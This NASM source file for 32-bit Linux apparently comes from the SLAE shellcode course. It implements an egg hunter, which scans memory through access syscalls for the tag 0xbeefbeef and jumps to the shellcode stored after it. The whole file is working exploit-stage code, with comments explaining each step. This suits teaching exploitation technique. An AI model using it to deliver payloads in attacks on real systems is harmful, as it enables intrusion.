; Filename: 	egghunting.nasm
; Author:	Jakub Heba
; Purpose:	SLAE Course & Exam 

global _start			

section .text

_start:
	xor edx, edx		; EDX cleaning 

loop:
	or dx, 0xfff		; 4096 bytes for iteration

iteration:
	inc edx 		; EDX is incremented

	lea ebx, [edx+0x4]	; Putting EDX + 4 bytes into the EBX, for preparing to the syscall (EBX is the first argument)

	push byte 0x21		; pushing value 33 for syscall defining

	pop eax			; syscall defining (#define __NR_access 33)

	int 0x80		; syscall execution
	cmp al, 0xf2		; comparing the return value with 0xf2, which means, that if syscall returns an EFAULT error, Zero Flag is set
	jz loop			; If comparing returns True (EFAULT error, ZF set), next 4096 bytes of memory, and next iteration

	mov eax, 0xbeefbeef 	; Our TAG
	mov edi, edx 		; Moving EDX into EDI

	scasd			; Comparing value in EDI with DWORD in EAX register, set ZF if True

	jnz iteration		; If False (ZF not set), JMP to the INC and repeat the process

	scasd			; Second comparing, the same story as above
	jnz iteration		; If False (ZF not set), JMP to the INC and repeat the process, otherwise, eggs are found

	jmp edi			; JMP directly to the right Shellcode
